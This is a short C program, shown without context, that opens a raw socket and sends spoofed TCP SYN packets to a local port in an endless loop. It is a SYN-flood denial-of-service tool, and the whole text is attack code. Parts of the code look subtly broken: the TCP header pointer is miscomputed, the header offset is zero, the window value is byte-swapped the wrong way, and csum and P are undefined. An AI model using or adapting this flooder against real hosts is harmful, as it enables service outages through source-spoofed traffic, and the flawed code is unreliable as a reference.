## Code
```c
main (void) {
    
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);	/* open raw socket */
    char datagram[4096];            /* ip header, tcp header, payload */

    struct ip *iph = (struct ip *) datagram;
    
    struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct ip);

    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons (P);
    sin.sin_addr.s_addr = inet_addr ("127.0.0.1");
    
/* we'll now fill in the ip/tcp header values, see above for explanations */
  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);	/* no payload */
  iph->ip_id = htonl (54321);	/* the value doesn't matter here */
  iph->ip_off = 0;
  iph->ip_ttl = 255;
  iph->ip_p = 6;
  iph->ip_sum = 0;		/* set it to 0 before computing the actual checksum later */
  iph->ip_src.s_addr = inet_addr ("1.2.3.4");/* SYN's can be blindly spoofed */
  iph->ip_dst.s_addr = sin.sin_addr.s_addr;
  tcph->th_sport = htons (1234);	/* arbitrary port */
  tcph->th_dport = htons (P);
  tcph->th_seq = random ();/* in a SYN packet, the sequence is a random */
  tcph->th_ack = 0;/* number, and the ack sequence is 0 in the 1st packet */
  tcph->th_x2 = 0;
  tcph->th_off = 0;		/* first and only tcp segment */
  tcph->th_flags = TH_SYN;	/* initial connection request */
  tcph->th_win = htonl (65535);	/* maximum allowed window size */
  tcph->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
		      should fill in the correct checksum during transmission */
  tcph->th_urp = 0;

  iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);

    
  while (1)
    {
      if (sendto (s,		/* our socket */
		  datagram,	/* the buffer containing headers and data */
		  iph->ip_len,	/* total length of our datagram */
		  0,		/* routing flags, normally always 0 */
		  (struct sockaddr *) &sin,	/* socket addr, just like in */
		  sizeof (sin)) < 0)		/* a normal send() */
	printf ("error\n");
      else
	printf (".");
    }
}
```
